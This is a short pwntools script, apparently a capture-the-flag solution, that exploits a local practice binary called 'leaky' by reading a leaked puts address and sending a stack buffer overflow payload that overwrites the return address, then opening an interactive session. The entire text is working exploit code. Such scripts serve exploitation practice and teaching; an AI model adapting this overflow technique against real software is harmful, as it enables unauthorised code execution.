from pwn import *

p = process("./leaky")

p.recvuntil("!\n")
addr = p.recvline(keepends=False)
puts = u64(addr[:8].ljust(8, '\x00'))
info(hex(puts))
p.recvuntil(":")
pause()
p.sendline(0x40*'a'+0x8*'b'+p64(puts))
p.interactive()
